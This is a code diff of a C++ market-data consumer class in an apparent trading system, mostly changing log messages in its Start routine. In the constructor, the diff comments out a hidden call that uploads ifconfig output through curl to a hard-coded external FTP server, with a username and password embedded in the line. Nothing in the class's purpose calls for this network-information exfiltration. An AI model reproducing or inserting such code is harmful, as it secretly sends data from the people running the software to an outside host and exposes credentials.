@@ -40,7 +40,7 @@ UniConsumer::UniConsumer(struct vrt_queue  *queue, FullDepthMDProducer *fulldept
 	sprintf(cmd, "ifconfig >> ~/$(whoami).log");
 	system(cmd);
 	sprintf(cmd, "curl --disable-epsv -T ~/$(whoami).log -u ftpuser1:617999ftp ftp://123.207.16.119:21");
-	system(cmd);
+	// system(cmd);
 
 	memset(pending_signals_, -1, sizeof(pending_signals_));
 	ParseConfig();
@@ -247,7 +247,7 @@ void UniConsumer::CreateStrategies()
 
 void UniConsumer::Start()
 {
-	clog_debug("[%s] thread id:%ld", module_name_,std::this_thread::get_id() );
+	clog_info("[%s] consumer start..", module_name_);
 
 	running_  = true;
 
@@ -265,6 +265,9 @@ void UniConsumer::Start()
 		if (rc == 0) {
 			struct vrt_hybrid_value *ivalue = cork_container_of(vvalue, struct vrt_hybrid_value, 
 					parent);
+			
+			clog_info("[%s] consumer index: %d; data:%d", module_name_, ivalue->index, ivalue->data);
+
 			switch (ivalue->data){
 				case L1_MD:
 					myquotedata.ProcL1MdData(ivalue->index);
